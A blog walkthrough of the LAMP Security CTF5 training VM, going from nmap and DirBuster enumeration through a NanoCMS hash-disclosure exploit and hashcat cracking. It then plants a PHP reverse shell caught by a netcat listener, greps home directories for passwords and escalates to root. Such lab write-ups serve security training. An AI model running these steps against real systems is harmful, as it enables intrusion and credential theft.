---
layout: blog_item
title:  "LAMP Security CTF5 - Walkthrough"
date:   2014-02-08 12:00:60
author: Arr0way
description: 'LAMP Security CTF 5 - Walkthrough Guide'
categories: [walkthroughs]
tags:
- CTF
---


<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

The LAMPSecurity project is an effort to produce training and benchmarking
tools that can be used to educate information security professionals and test
products.

**Author:** madirish2600

**Download:** [VulnHub](https://www.vulnhub.com/) via [@VulnHub](https://twitter.com/VulnHub)


## Enumeration

### Host Service Enumeration

{% highlight bash %}

nmap -v -p 1-65535 -sV -O -sT 192.168.30.130

{% endhighlight %}

<div class="note info">
  <h5>Dislcaimer: Multiple Entry Points</h5>
  <p>The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the **web application** as the entry point.</p>
</div>

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 22</code></p></pc>
           </td>
           <td>
               <pc><p>SSH</p></pc>
           </td>
           <td>
               <pc><p>OpenSSH 4.7 (protocol 2.0)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 25</code></p></pc>
           </td>
           <td>
              <pc><p>SMTP</p></pc>
           </td>
           <td>
               <pc><p>Sendmail 8.14.1/8.14.1</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
              <pc><p>HTTPD</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.6 ((Fedora))</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 110</code></p></pc>
           </td>
           <td>
              <pc><p>POP3</p></pc>
           </td>
           <td>
               <pc><p>ipop3d 2006k.101</p></pc>
           </td>
        </tr>
        <tr>
          <td>
               <pc><p><code>TCP: 111</code></p></pc>
           </td>
           <td>
              <pc><p>rpcbind</p></pc>
           </td>
           <td>
               <pc><p>N/A</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 138</code></p></pc>
           </td>
           <td>
              <pc><p>netbios-ssn</p></pc>
           </td>
           <td>
               <pc><p>Samba smbd 3.X</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 143</code></p></pc>
           </td>
           <td>
              <pc><p>IMAP</p></pc>
           </td>
           <td>
               <pc><p>University of Washington IMAP imapd</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 445</code></p></pc>
           </td>
           <td>
              <pc><p>netbios-ssn</p></pc>
           </td>
           <td>
               <pc><p>Samba smbd 3.X (workgroup: MYGROUP)</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP:901 </code></p></pc>
           </td>
           <td>
              <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Samba SWAT administration server</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP:3306 </code></p></pc>
           </td>
           <td>
              <pc><p>MySQL</p></pc>
           </td>
           <td>
               <pc><p>MySQL 5.0.45</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP:36644 </code></p></pc>
           </td>
           <td>
              <pc><p>RPC</p></pc>
           </td>
           <td>
               <pc><p>RPC</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP:36644 </code></p></pc>
           </td>
           <td>
              <pc><p>RPC</p></pc>
           </td>
           <td>
               <pc><p>RPC</p></pc>
           </td>
        </tr>

      </tbody>

</table>
</div>

### HTTP Enumeration

Inspection of the Web Application revealed the blog used a URL path of <code>/~andy/</code>, indicating it was serving an Apache home dir - username enumeration is possible. Further inspection of the web application indicated the use of GET requests <code>/?page=contact</code>,  


#### Forced Browsing

Dirbuster revealed the directory <code>/~andy/data/nanoadmin.php</code>,
indicating the site used NanoCMS (this was confirmed by viewing the page
source code).

![OWASP DirBuster](/img/blog/ctf5/dirbuster.png)

## Web Application Enumeration

Viewing the web application disclosed the application used "NanoCMS", this
information was also previously discovered using Dirbuster. Research indicated a NanoCMS
vulnerability existed that disclosed the applications password hashes.
[http://www.securityfocus.com/bid/34508/exploit](http://www.securityfocus.com/bid/34508/exploit)


### Hash Disclosure

Admin hases were successfully retrived using the discovered NanoCMS exploit:

![NanoCMS Hash Expose Vuln](/img/blog/ctf5/nanocms-vuln-hash.png)

### Verified Hash Type

Hash Identifier was used to confirm the hash was md5.

![Hash Identifier](/img/blog/ctf5/hash-identifier.png)

## Hashcat md5 cracking

Hashcat was used to crack the hash.

{% highlight bash %}
# hashcat -m 0 -a 0 ctf5-hash.txt /usr/share/wordlists/rockyou.txt
{% endhighlight %}

Discovered password: <code>9d2f75377ac0ab991d40c91fd27e52fd:shannon</code>

## Web Application Exploitation

Authentication was successful using the previously cracked hash credential. I
new page was created containing php reverse shell code:

![NanoCMS PHP Reverse Shell](/img/blog/ctf5/nanocms-webshell.png)

A netcat reverse handler was setup <code>nc -n -v -l -p 443</code>, the shell
successfully connected back.

![php reverse shell](/img/blog/ctf5/rev-shell.png)

## Linux Local Enumeration

Enumeration indicated <code>/home/</code> directories were readable.

Grep'ing for the string **password** discovered the following:


{% highlight bash%}
sh-3.2$ grep -R -i password /home/*

Discovered the file:

/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  <title>Root
password</title>
/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  <text
xml:space="preserve"><note-content version="0.1">Root password
/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:Root password
{% endhighlight %}

The file contained the root credentials.


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Username</th>
      <th>Password</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>root</code></p></pc>
           </td>
           <td>
               <pc><p>50$cent</p></pc>
           </td>
        </tr>
      </tbody>

</table>
</div>

## Local Privilege Escalation

{% highlight bash %}
sh-3.2$ su -
standard in must be a tty
sh-3.2$ python -c 'import pty;pty.spawn("/bin/sh")'
bash-3.2$ su -
su -
Password: 50$cent

[root@localhost ~]# whoami
whoami
root
[root@localhost ~]# id
id
uid=0(root) gid=0(root)
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
context=system_u:system_r:httpd_t:s0
{% endhighlight %}

Thanks for the VM :)
